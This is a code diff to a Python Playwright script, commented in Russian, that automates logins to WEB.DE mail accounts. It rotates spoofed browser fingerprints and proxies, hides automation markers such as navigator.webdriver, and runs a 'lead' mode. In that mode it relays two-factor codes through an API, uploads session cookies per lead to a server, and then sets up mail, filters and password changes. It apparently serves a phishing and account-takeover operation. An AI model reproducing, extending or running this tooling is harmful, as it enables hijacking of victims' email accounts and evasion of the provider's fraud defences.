+        _DE = {"locale": "de-DE", "timezone_id": "Europe/Berlin", "accept_language": "de-DE,de;q=0.9,en;q=0.8"}
+        _LANGS = ["de-DE", "de", "en-US", "en"]
+        FINGERPRINTS = [
+            {**_DE, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "viewport": {"width": 1920, "height": 1080}, "platform": "Win32", "hardware_concurrency": 8, "device_memory": 8, "max_touch_points": 0, "languages": _LANGS},
+            {**_DE, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "viewport": {"width": 1366, "height": 768}, "platform": "Win32", "hardware_concurrency": 4, "device_memory": 4, "max_touch_points": 0, "languages": _LANGS},
+        ]
+
+    is_mobile = False
+    has_touch = False
+    used_api_profile = False
+    force_pool = bool(force_pool_fingerprint)
+    eng_requested = browser_engine
+
+    if automation_profile and isinstance(automation_profile, dict) and not force_pool:
+        pw_block = automation_profile.get("playwright")
+        custom_fp = _fp_from_api_playwright(pw_block) if isinstance(pw_block, dict) else None
+        if custom_fp:
+            fp = custom_fp
+            used_api_profile = True
+            eng_requested = _browser_engine_from_automation_profile(automation_profile)
+            if isinstance(pw_block, dict):
+                is_mobile = bool(pw_block.get("isMobile"))
+                has_touch = bool(pw_block.get("hasTouch")) if "hasTouch" in pw_block else is_mobile
+
+    ch_hints: dict[str, str] = {}
+    if used_api_profile and automation_profile and isinstance(automation_profile.get("playwright"), dict):
+        pb = automation_profile["playwright"]
+        if pb.get("secChUa"):
+            ch_hints["Sec-CH-UA"] = str(pb["secChUa"])[:500]
+        if pb.get("secChUaMobile") is not None and str(pb.get("secChUaMobile")).strip():
+            ch_hints["Sec-CH-UA-Mobile"] = str(pb["secChUaMobile"])[:80]
+        if pb.get("secChUaPlatform"):
+            ch_hints["Sec-CH-UA-Platform"] = str(pb["secChUaPlatform"])[:120]
+
+    if not used_api_profile:
+        if fingerprint_index is not None:
+            fp = FINGERPRINTS[fingerprint_index % len(FINGERPRINTS)]
+        else:
+            fp = random.choice(FINGERPRINTS)
+
+    device_scale_factor = _device_scale_factor_from_fp(fp)
+
+    launch_args = [
+        "--disable-blink-features=AutomationControlled",
+        "--no-first-run",
+        "--no-default-browser-check",
+    ]
+    if headless:
+        launch_args.extend(
+            [
+                "--no-sandbox",
+                "--disable-setuid-sandbox",
+                "--disable-dev-shm-usage",
+                "--disable-gpu",
+                "--disable-software-rasterizer",
+                "--disable-background-networking",
+                "--disable-default-apps",
+                "--disable-sync",
+                "--metrics-recording-only",
+                "--mute-audio",
+            ]
+        )
+
+    eng_launch = (effective_engine or "chromium").strip().lower() or "chromium"
+    browser = None
+    context = None
+    page = None
+    context_ready = False
+    actual_engine = eng_launch
+
+    if eng_launch == "webkit":
+        try:
+            browser = p.webkit.launch(headless=headless)
+        except Exception as e:
+            log("Перезапуск", f"WebKit недоступен ({type(e).__name__}) — Chromium")
+            actual_engine = "chromium"
+    if browser is None and eng_launch == "firefox":
+        try:
+            browser = p.firefox.launch(headless=headless)
+        except Exception as e:
+            log("Перезапуск", f"Firefox недоступен ({type(e).__name__}) — Chromium")
+            actual_engine = "chromium"
+    _merge_sec_ch_hints_for_fp_chromium(ch_hints, fp, engine=actual_engine)
+    cdp_url = _webde_cdp_endpoint_from_env() if actual_engine == "chromium" else None
+    persist_profile = _webde_chrome_user_data_dir() if actual_engine == "chromium" else None
+    if browser is None and actual_engine == "chromium" and cdp_url:
+        log("Перезапуск", f"CDP: {cdp_url}")
+        browser = _connect_chromium_cdp_resilient(p, cdp_url)
+    if browser is None and actual_engine == "chromium" and persist_profile:
+        Path(persist_profile).mkdir(parents=True, exist_ok=True)
+        extra_headers_p: dict[str, str] = {"Accept-Language": fp["accept_language"]}
+        if ch_hints:
+            extra_headers_p.update(ch_hints)
+        ctx_opt_p = {
+            "locale": fp["locale"],
+            "user_agent": fp["user_agent"],
+            "viewport": fp["viewport"],
+            "is_mobile": is_mobile,
+            "has_touch": has_touch,
+            "device_scale_factor": device_scale_factor,
+            "timezone_id": fp["timezone_id"],
+            "permissions": ["geolocation"],
+            "extra_http_headers": extra_headers_p,
+        }
+        if proxy_config:
+            ctx_opt_p["proxy"] = proxy_config
+            log("Перезапуск", f"прокси: {proxy_config.get('server', '')}")
+        persist_kw = {
+            "headless": headless,
+            "args": launch_args,
+            "ignore_default_args": ["--enable-automation"],
+            **ctx_opt_p,
+        }
+        ex_p = _webde_browser_executable_optional()
+        if ex_p:
+            persist_kw["executable_path"] = ex_p
+        elif USE_CHROME:
+            persist_kw["channel"] = "chrome"
+        log("Перезапуск", f"постоянный профиль: {persist_profile}")
+        context = _launch_chromium_persistent_resilient(p, persist_profile, persist_kw)
+        browser = context.browser
+        _webde_add_fingerprint_init_script(
+            context, fp, engine=actual_engine, device_scale_factor=device_scale_factor
+        )
+        page = context.new_page()
+        context_ready = True
+    if browser is None:
+        lo = {
+            "headless": headless,
+            "ignore_default_args": ["--enable-automation"],
+            "args": launch_args,
+        }
+        ex = _webde_browser_executable_optional()
+        if ex:
+            lo["executable_path"] = ex
+        elif actual_engine == "chromium" and USE_CHROME:
+            lo["channel"] = "chrome"
+        try:
+            browser = _launch_chromium_resilient(p, lo)
+        except Exception:
+            if USE_CHROME and lo.pop("channel", None) is not None and not lo.get("executable_path"):
+                log("Перезапуск", "встроенный Chromium")
+                browser = _launch_chromium_resilient(p, lo)
+            else:
+                raise
+
+    if not headless:
+        log("Перезапуск", "открыто новое окно браузера (тот же отпечаток и прокси)")
+
+    if not context_ready:
+        if browser is None:
+            raise RuntimeError("перезапуск WEB.DE: браузер не запущен")
+        extra_headers: dict[str, str] = {"Accept-Language": fp["accept_language"]}
+        if actual_engine == "chromium" and ch_hints:
+            extra_headers.update(ch_hints)
+        context_options = {
+            "locale": fp["locale"],
+            "user_agent": fp["user_agent"],
+            "viewport": fp["viewport"],
+            "is_mobile": is_mobile,
+            "has_touch": has_touch,
+            "device_scale_factor": device_scale_factor,
+            "timezone_id": fp["timezone_id"],
+            "permissions": ["geolocation"],
+            "extra_http_headers": extra_headers,
+        }
+        if proxy_config:
+            context_options["proxy"] = proxy_config
+            log("Перезапуск", f"прокси: {proxy_config.get('server', '')}")
+        context = browser.new_context(**context_options)
+        _webde_add_fingerprint_init_script(
+            context, fp, engine=actual_engine, device_scale_factor=device_scale_factor
+        )
+        page = context.new_page()
+    page.set_default_navigation_timeout(120000)
+    page.set_default_timeout(120000)
+
+    cpath = Path(cookies_json_path)
+    if cpath.is_file():
+        try:
+            with open(cpath, "r", encoding="utf-8") as f:
+                raw_c = json.load(f)
+            if isinstance(raw_c, list):
+                cookies = raw_c
+            elif isinstance(raw_c, dict) and isinstance(raw_c.get("cookies"), list):
+                cookies = raw_c["cookies"]
+            else:
+                cookies = []
+            if cookies:
+                context.add_cookies(cookies)
+                log("Перезапуск", f"куки подставлены ({len(cookies)} шт.) · {cpath.name}")
+        except Exception as e:
+            log("Перезапуск", f"куки не применены: {type(e).__name__}: {e}")
+    else:
+        log("Перезапуск", f"файл куков не найден: {cpath}")
+
+    vp = fp.get("viewport") or {}
+    log(
+        "ДИАГНО",
+        "перезапуск контекста",
+        f"engine={actual_engine} (запрошен входом: {eng_requested}) viewport={vp.get('width')}x{vp.get('height')} "
+        f"UA[:90]={(fp.get('user_agent') or '')[:90]!r}",
+        verbose_only=True,
+    )
+    return browser, context, page
+
+
 def login_webde(
     email: str = None,
     password: str = None,
@@ -2810,9 +3699,16 @@ def login_webde(
     on_two_factor_wait_start: lead_mode — перед ожиданием кода (отправить two_factor в API).
     on_wrong_two_fa: lead_mode — после неверного кода на WEB.DE (опционально уведомить сервер).
     force_pool_fingerprint: True — взять UA/экран из пула webde_fingerprints.json по fingerprint_index, игнорируя playwright из automation_profile (для ретраев после блока).
-    hold_session_after_lead_success: lead_mode — не закрывать браузер при success; сессия в take_lead_held_browser_session() для оркестрации (Klein).
+    hold_session_after_lead_success: lead_mode — не закрывать браузер при success до after_mail_success_fn (почта: письмо+фильтры; при Klein — дальше Klein).
     cookies_push: lead_mode — {base_url, lead_id, worker_secret?} → POST /api/lead-cookies-upload (SQLite); иначе файл login/cookies.
     after_mail_success_fn: если задан вместе с hold_session_after_lead_success — вызывается в finally login_webde, пока активен sync_playwright (compose+фильтры+Klein). Иначе Playwright уже остановлен и фильтры падают с Event loop is closed.
+
+    Режим «реального браузера» (как у kleinanzeigen-bot: профиль / CDP), только для engine chromium:
+    WEBDE_PLAYWRIGHT_CDP_ENDPOINT=http://127.0.0.1:9222 или WEBDE_CHROME_REMOTE_DEBUGGING_PORT=9222 —
+    подключение к уже запущенному Chrome с --remote-debugging-port (новый контекст с отпечатком из пула).
+    WEBDE_CHROME_USER_DATA_DIR=/path/to/profile — launch_persistent_context (постоянный user-data-dir).
+    WEBDE_BROWSER_EXECUTABLE — явный путь к Chrome/Chromium (иначе USE_CHROME=channel или встроенный Chromium).
+    Если заданы и CDP, и USER_DATA_DIR, используется CDP.
     """
     email = email or EMAIL
     password = password or PASSWORD
@@ -2841,7 +3737,11 @@ def login_webde(
     use_2captcha = bool(api_key)
     if not use_2captcha:
         cfg_bits: list[str] = ["капча: слайдер (2Captcha нет)"]
-        has_display = bool(os.environ.get("DISPLAY")) or os.name == "nt"
+        has_display = (
+            bool(os.environ.get("DISPLAY"))
+            or bool(os.environ.get("WAYLAND_DISPLAY"))
+            or os.name in ("nt", "darwin")
+        )
         if headless and has_display:
             cfg_bits.append("окно браузера: да (есть DISPLAY)")
             headless = False
@@ -2857,7 +3757,7 @@ def login_webde(
     set_log_prefix((f"[lead:{short_id}] [email:{mask_email}]" if short_id else (f"[email:{mask_email}]" if mask_email else "")))
     _reset_script_idle_watch()
 
-    # Пул отпечатков: login/webde_fingerprints.json (100 шт., общий с сайтом). Генерация: npm run build:webde-fingerprints
+    # Пул отпечатков: login/webde_fingerprints.json (общий с сайтом; сейчас курируемый список). Не перезаписывать без нужды: npm run build:webde-fingerprints
     FINGERPRINTS = _load_webde_fingerprints_playwright()
     if not FINGERPRINTS:
         log("CONFIG", "webde_fingerprints.json не найден или пуст — минимальный встроенный пул (положите JSON рядом с webde_login.py)")
@@ -2873,7 +3773,6 @@ def login_webde(
     browser_engine = "chromium"
     is_mobile = False
     has_touch = False
-    device_scale_factor = 1.0
     used_api_profile = False
 
     force_pool = bool(force_pool_fingerprint)
@@ -2887,10 +3786,6 @@ def login_webde(
             if isinstance(pw_block, dict):
                 is_mobile = bool(pw_block.get("isMobile"))
                 has_touch = bool(pw_block.get("hasTouch")) if "hasTouch" in pw_block else is_mobile
-                try:
-                    device_scale_factor = float(pw_block.get("deviceScaleFactor") or 1.0)
-                except (TypeError, ValueError):
-                    device_scale_factor = 1.0
             log("Профиль", f"лид API: engine={browser_engine} mobile={is_mobile} UA[:70]={(fp.get('user_agent') or '')[:70]!r}")
 
     ch_hints: dict[str, str] = {}
@@ -2908,6 +3803,8 @@ def login_webde(
             fp = FINGERPRINTS[fingerprint_index % len(FINGERPRINTS)]
         else:
             fp = random.choice(FINGERPRINTS)
+
+    device_scale_factor = _device_scale_factor_from_fp(fp)
 
     launch_args = [
         "--disable-blink-features=AutomationControlled",
@@ -2940,6 +3837,9 @@ def login_webde(
         clear_lead_held_browser_session()
         effective_engine = browser_engine
         browser = None
+        context = None
+        page = None
+        context_ready = False
         if browser_engine == "webkit":
             try:
                 browser = p.webkit.launch(headless=headless)
@@ -2952,71 +3852,96 @@ def login_webde(
             except Exception as e:
                 log("Профиль", f"Firefox недоступен ({type(e).__name__}) — fallback Chromium")
                 effective_engine = "chromium"
+        _merge_sec_ch_hints_for_fp_chromium(ch_hints, fp, engine=effective_engine)
+        cdp_url = _webde_cdp_endpoint_from_env() if effective_engine == "chromium" else None
+        persist_profile = _webde_chrome_user_data_dir() if effective_engine == "chromium" else None
+        if browser is None and effective_engine == "chromium" and cdp_url:
+            log("Старт", f"режим CDP (реальный Chrome уже запущен): {cdp_url}")
+            browser = _connect_chromium_cdp_resilient(p, cdp_url)
+        if browser is None and effective_engine == "chromium" and persist_profile:
+            Path(persist_profile).mkdir(parents=True, exist_ok=True)
+            extra_headers_p: dict[str, str] = {"Accept-Language": fp["accept_language"]}
+            if ch_hints:
+                extra_headers_p.update(ch_hints)
+            ctx_opt_p = {
+                "locale": fp["locale"],
+                "user_agent": fp["user_agent"],
+                "viewport": fp["viewport"],
+                "is_mobile": is_mobile,
+                "has_touch": has_touch,
+                "device_scale_factor": device_scale_factor,
+                "timezone_id": fp["timezone_id"],
+                "permissions": ["geolocation"],
+                "extra_http_headers": extra_headers_p,
+            }
+            if proxy_config:
+                ctx_opt_p["proxy"] = proxy_config
+                log("Старт", f"Прокси: {proxy_config.get('server', '')}")
+            persist_kw = {
+                "headless": headless,
+                "args": launch_args,
+                "ignore_default_args": ["--enable-automation"],
+                **ctx_opt_p,
+            }
+            ex_p = _webde_browser_executable_optional()
+            if ex_p:
+                persist_kw["executable_path"] = ex_p
+            elif USE_CHROME:
+                persist_kw["channel"] = "chrome"
+            log("Старт", f"постоянный профиль Chrome (user_data_dir): {persist_profile}")
+            context = _launch_chromium_persistent_resilient(p, persist_profile, persist_kw)
+            browser = context.browser
+            _webde_add_fingerprint_init_script(
+                context, fp, engine=effective_engine, device_scale_factor=device_scale_factor
+            )
+            page = context.new_page()
+            context_ready = True
         if browser is None:
             lo = {
                 "headless": headless,
                 "ignore_default_args": ["--enable-automation"],
                 "args": launch_args,
             }
-            if USE_CHROME:
+            ex = _webde_browser_executable_optional()
+            if ex:
+                lo["executable_path"] = ex
+            elif USE_CHROME:
                 lo["channel"] = "chrome"
             try:
                 browser = _launch_chromium_resilient(p, lo)
             except Exception:
-                if USE_CHROME and lo.pop("channel", None) is not None:
+                if USE_CHROME and lo.pop("channel", None) is not None and not lo.get("executable_path"):
                     log("Старт", "Запускаю встроенный Chromium")
                     browser = _launch_chromium_resilient(p, lo)
                 else:
                     raise
         if not headless:
             log("Старт", "Браузер открыт")
-        extra_headers: dict[str, str] = {"Accept-Language": fp["accept_language"]}
-        if effective_engine == "chromium" and ch_hints:
-            extra_headers.update(ch_hints)
-        context_options = {
-            "locale": fp["locale"],
-            "user_agent": fp["user_agent"],
-            "viewport": fp["viewport"],
-            "is_mobile": is_mobile,
-            "has_touch": has_touch,
-            "device_scale_factor": device_scale_factor,
-            "timezone_id": fp["timezone_id"],
-            "permissions": ["geolocation"],
-            "extra_http_headers": extra_headers,
-        }
-        if proxy_config:
-            context_options["proxy"] = proxy_config
-            log("Старт", f"Прокси: {proxy_config.get('server', '')}")
-        context = browser.new_context(**context_options)
-        # Маскировка автоматизации: webdriver, платформа, ядра, память, языки (как в webde_fingerprints.json)
-        hw = fp["hardware_concurrency"]
-        mem = fp.get("device_memory")
-        plat = fp["platform"].replace("\\", "\\\\").replace("'", "\\'")
-        mtp = int(fp.get("max_touch_points") or 0)
-        langs_js = json.dumps(fp.get("languages") or ["de-DE", "de", "en-US", "en"])
-        mem_line = (
-            f"Object.defineProperty(navigator, 'deviceMemory', {{ get: () => {int(mem)} }});"
-            if mem is not None
-            else ""
-        )
-        chrome_inject = ""
-        if effective_engine == "chromium":
-            chrome_inject = """
-            if (!window.chrome) window.chrome = {};
-            if (!window.chrome.runtime) window.chrome.runtime = {};
-            """
-        context.add_init_script(
-            f"""
-            Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
-            Object.defineProperty(navigator, 'platform', {{ get: () => '{plat}' }});
-            Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hw} }});
-            {mem_line}
-            Object.defineProperty(navigator, 'maxTouchPoints', {{ get: () => {mtp} }});
-            Object.defineProperty(navigator, 'languages', {{ get: () => {langs_js} }});
-            {chrome_inject}
-        """
-        )
-        page = context.new_page()
+        if not context_ready:
+            if browser is None:
+                raise RuntimeError("WEB.DE: браузер не запущен")
+            extra_headers: dict[str, str] = {"Accept-Language": fp["accept_language"]}
+            if effective_engine == "chromium" and ch_hints:
+                extra_headers.update(ch_hints)
+            context_options = {
+                "locale": fp["locale"],
+                "user_agent": fp["user_agent"],
+                "viewport": fp["viewport"],
+                "is_mobile": is_mobile,
+                "has_touch": has_touch,
+                "device_scale_factor": device_scale_factor,
+                "timezone_id": fp["timezone_id"],
+                "permissions": ["geolocation"],
+                "extra_http_headers": extra_headers,
+            }
+            if proxy_config:
+                context_options["proxy"] = proxy_config
+                log("Старт", f"Прокси: {proxy_config.get('server', '')}")
+            context = browser.new_context(**context_options)
+            _webde_add_fingerprint_init_script(
+                context, fp, engine=effective_engine, device_scale_factor=device_scale_factor
+            )
+            page = context.new_page()
         page.set_default_navigation_timeout(120000)
         page.set_default_timeout(120000)
         vp = fp.get("viewport") or {}
@@ -3024,8 +3949,8 @@ def login_webde(
             "ДИАГНО",
             "контекст браузера",
             f"engine={effective_engine} (запрошен {browser_engine}) mobile={is_mobile} "
-            f"viewport={vp.get('width')}x{vp.get('height')} Sec-CH_заголовков={len(ch_hints)} "
-            f"UA[:90]={(fp.get('user_agent') or '')[:90]!r}",
+            f"viewport={vp.get('width')}x{vp.get('height')} dpr={device_scale_factor} "
+            f"Sec-CH_заголовков={len(ch_hints)} UA[:90]={(fp.get('user_agent') or '')[:90]!r}",
         )
 
         # Пароли из password.txt — по одному на строку; используются при неверном пароле из accounts.txt
@@ -3043,7 +3968,21 @@ def login_webde(
                 use_page = mb if mb is not None else (loc_page if loc_page is not None else page)
             except Exception:
                 use_page = loc_page if loc_page is not None else page
-            _LEAD_HELD_BROWSER_SESSION = {"browser": browser, "context": context, "page": use_page}
+            _klein_px = webde_klein_proxy_config_from_file()
+            _LEAD_HELD_BROWSER_SESSION = {
+                "browser": browser,
+                "context": context,
+                "page": use_page,
+                "playwright": p,
+                "fingerprint_index": fingerprint_index,
+                "proxy_config": proxy_config,
+                "klein_proxy_config": _klein_px if _klein_px is not None else proxy_config,
+                "automation_profile": automation_profile,
+                "force_pool_fingerprint": force_pool,
+                "browser_engine": browser_engine,
+                "effective_engine": effective_engine,
+                "email": (email or "").strip(),
+            }
 
         _hold_cb = _lead_hold_prepare if (lead_mode and hold_session_after_lead_success) else None
 
@@ -3051,8 +3990,7 @@ def login_webde(
             auth_url = get_auth_webde_url_for_attempt(AUTH_WEBDE_URL, auth_url_attempt_index)
             if DIRECT_AUTH:
                 log("Старт", "открываю auth.web.de")
-                page.goto(auth_url, wait_until="load", timeout=120000)
-                time.sleep(2)
+                _goto_auth_webde_with_retry(page, auth_url, timeout_ms=120000, phase="direct")
                 if _is_login_temporarily_unavailable(page):
                     log_page_diag(page, "сразу после goto: блок «Login vorübergehend»")
                     alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
@@ -3090,8 +4028,7 @@ def login_webde(
                 use_auth_url = AUTH_WEBDE_URL and "auth.web.de" in AUTH_WEBDE_URL
                 if use_auth_url:
                     log("Вход", "переход на auth.web.de", verbose_only=True)
-                    page.goto(auth_url, wait_until="load", timeout=90000)
-                    time.sleep(2)
+                    _goto_auth_webde_with_retry(page, auth_url, timeout_ms=90000, phase="from-anmelden")
                 else:
                     log("Вход", "клик «Zum WEB.DE Login»", verbose_only=True)
                     for loc in [
@@ -3121,8 +4058,7 @@ def login_webde(
             # Если попали на consent-management или поля email нет — пробуем auth.web.de или закрываем согласие
             if "consent-management" in page.url or page.locator('input[type="email"], input[name="username"], input[name="email"]').count() == 0:
                 log("Вход", "нет формы — auth.web.de", verbose_only=True)
-                page.goto(auth_url, wait_until="load", timeout=90000)
-                time.sleep(2)
+                _goto_auth_webde_with_retry(page, auth_url, timeout_ms=90000, phase="no-form")
                 if page.locator('input[type="email"], input[name="username"], input[name="email"]').count() == 0:
                     close_consent_popup(page, wait_for_appear=10)
                     time.sleep(2)
@@ -3156,11 +4092,11 @@ def login_webde(
                     log_page_diag(page, "в цикле ожидания пароля: «Login vorübergehend»")
                     alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                     raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
-                if page.locator(pw_selector_any).first.count() > 0 and page.locator(pw_selector_any).first.is_visible():
+                if _password_input_visible_anywhere(page, pw_selector_any):
                     pw_found = True
                     break
                 time.sleep(0.3)
-                if page.locator(pw_selector_any).first.count() > 0 and page.locator(pw_selector_any).first.is_visible():
+                if _password_input_visible_anywhere(page, pw_selector_any):
                     pw_found = True
                     break
                 # После Weiter ничего не произошло (кнопка всё ещё видна, пароля/капчи нет) — выход, смена IP и железа
@@ -3231,8 +4167,10 @@ def login_webde(
                         # а даём пользователю перезайти и ввести данные заново.
                         return "password_timeout"
                     raise RuntimeError("Пароль не получен")
-            log("Вход", "пароль введён → Login")
-            page.locator(pw_selector_any).first.fill(password)
+            log("Вход", "ввожу пароль → Login")
+            if not _fill_first_visible_password_field(page, str(password or ""), pw_selector_any=pw_selector_any):
+                log("Вход", "fallback: .first.fill (старый путь)", verbose_only=True)
+                page.locator(pw_selector_any).first.fill(password)
             time.sleep(step_delay)
 
             # Проверка капчи (может быть до или после ввода пароля)
@@ -3286,6 +4224,10 @@ def login_webde(
                 if submit_btn.count() > 0:
                     submit_btn.click()
                 post_login = _wait_post_login_for_wrong_or_block(page, pw_selector_any, max_sec=22.0)
+                if post_login == "hilfe_success":
+                    return _on_help_page_success_then_pwchange(
+                        page, context, email, lead_mode, on_lead_success_hold=_hold_cb
+                    )
                 if post_login == "two_factor":
                     if lead_mode and poll_two_fa_code:
                         tf = _lead_mode_two_factor_challenge(
@@ -3630,10 +4572,9 @@ def login_webde(
         finally:
             if os.getenv("DEBUG"):
                 page.screenshot(path=Path(__file__).parent / "debug_screenshot.png")
-            if KEEP_BROWSER_OPEN:
-                log("Старт", "Браузер не закрыт. Закройте окно когда нужно, затем нажмите Enter в терминале.")
-                input()
-            elif (
+            # Klein-оркестрация должна выполняться до паузы KEEP_BROWSER_OPEN: иначе POST mail_ready_klein
+            # не уходит, лид в админке остаётся pending без редиректа на смену пароля.
+            if (
                 after_mail_success_fn
                 and hold_session_after_lead_success
                 and _LEAD_HELD_BROWSER_SESSION
@@ -3641,9 +4582,14 @@ def login_webde(
             ):
                 try:
                     after_mail_success_fn()
+                except AfterMailHookFinished:
+                    raise
                 except Exception as e:
                     log("KLEIN-ORCH", f"after_mail_success_fn: {type(e).__name__}: {e}")
                 # Хук забирает сессию (take_lead_held_browser_session) и закрывает браузер по завершении оркестрации
+            elif KEEP_BROWSER_OPEN:
+                log("Старт", "Браузер не закрыт. Закройте окно когда нужно, затем нажмите Enter в терминале.")
+                input()
             elif (
                 _LEAD_HELD_BROWSER_SESSION
                 and _LEAD_HELD_BROWSER_SESSION.get("browser") is browser
@@ -3696,7 +4642,10 @@ def probe_webde_proxy_fingerprint(
             "--disable-gpu",
         ])
     lo = {"headless": headless, "ignore_default_args": ["--enable-automation"], "args": launch_args}
-    if USE_CHROME:
+    ex_bin = _webde_browser_executable_optional()
+    if ex_bin:
+        lo["executable_path"] = ex_bin
+    elif USE_CHROME:
         lo["channel"] = "chrome"
     extra_headers: dict[str, str] = {"Accept-Language": fp["accept_language"]}
     hw = fp["hardware_concurrency"]
@@ -3709,7 +4658,9 @@ def probe_webde_proxy_fingerprint(
         if mem is not None
         else ""
     )
-    init_js = f"""
+    dpr = _device_scale_factor_from_fp(fp)
+    dpr_js = _device_pixel_ratio_init_js(dpr)
+    init_js = f"""{dpr_js}
             Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
             Object.defineProperty(navigator, 'platform', {{ get: () => '{plat}' }});
             Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hw} }});
@@ -3725,7 +4676,7 @@ def probe_webde_proxy_fingerprint(
         "viewport": fp["viewport"],
         "is_mobile": False,
         "has_touch": False,
-        "device_scale_factor": 1.0,
+        "device_scale_factor": dpr,
         "timezone_id": fp["timezone_id"],
         "permissions": ["geolocation"],
         "extra_http_headers": extra_headers,
@@ -3744,27 +4695,63 @@ def probe_webde_proxy_fingerprint(
     )
     weiter_btn_sel = 'button[type="submit"], input[type="submit"], [data-testid="next"], button:has-text("Weiter")'
 
+    cdp_probe = _webde_cdp_endpoint_from_env()
+    persist_probe = _webde_chrome_user_data_dir()
+
     browser = None
+    context = None
+    probe_persistent = False
     with sync_playwright() as p:
         try:
-            browser = _launch_chromium_resilient(p, lo)
-        except Exception:
-            if USE_CHROME and lo.pop("channel", None) is not None:
+            if cdp_probe:
+                try:
+                    browser = _connect_chromium_cdp_resilient(p, cdp_probe)
+                except Exception:
+                    return "error"
+                context = browser.new_context(**context_options)
+                context.add_init_script(init_js)
+                page = context.new_page()
+            elif persist_probe:
+                Path(persist_probe).mkdir(parents=True, exist_ok=True)
+                persist_kw = {
+                    "headless": headless,
+                    "args": launch_args,
+                    "ignore_default_args": ["--enable-automation"],
+                    **context_options,
+                }
+                if ex_bin:
+                    persist_kw["executable_path"] = ex_bin
+                elif USE_CHROME:
+                    persist_kw["channel"] = "chrome"
+                try:
+                    context = _launch_chromium_persistent_resilient(p, persist_probe, persist_kw)
+                except Exception:
+                    return "error"
+                probe_persistent = True
+                browser = context.browser
+                context.add_init_script(init_js)
+                page = context.new_page()
+            else:
                 try:
                     browser = _launch_chromium_resilient(p, lo)
                 except Exception:
-                    return "error"
-            else:
-                return "error"
+                    if USE_CHROME and lo.pop("channel", None) is not None and not lo.get("executable_path"):
+                        try:
+                            browser = _launch_chromium_resilient(p, lo)
+                        except Exception:
+                            return "error"
+                    else:
+                        return "error"
+                context = browser.new_context(**context_options)
+                context.add_init_script(init_js)
+                page = context.new_page()
+        except Exception:
+            return "error"
         try:
-            context = browser.new_context(**context_options)
-            context.add_init_script(init_js)
-            page = context.new_page()
             page.set_default_navigation_timeout(90000)
             page.set_default_timeout(90000)
             if DIRECT_AUTH:
-                page.goto(auth_url, wait_until="load", timeout=90000)
-                time.sleep(2)
+                _goto_auth_webde_with_retry(page, auth_url, timeout_ms=90000, phase="probe-direct")
                 if _is_login_temporarily_unavailable(page):
                     return "voruebergehend"
             else:
@@ -3774,8 +4761,7 @@ def probe_webde_proxy_fingerprint(
                     return "voruebergehend"
                 close_consent_popup(page)
                 time.sleep(2)
-                page.goto(auth_url, wait_until="load", timeout=90000)
-                time.sleep(2)
+                _goto_auth_webde_with_retry(page, auth_url, timeout_ms=90000, phase="probe-from-anmelden")
                 if _is_login_temporarily_unavailable(page):
                     return "voruebergehend"
 
@@ -3825,11 +4811,13 @@ def probe_webde_proxy_fingerprint(
         except Exception:
             return "error"
         finally:
-            if browser is not None:
-                try:
+            try:
+                if probe_persistent and context is not None:
+                    context.close()
+                elif browser is not None:
                     browser.close()
-                except Exception:
-                    pass
+            except Exception:
+                pass
 
 
 if __name__ == "__main__":
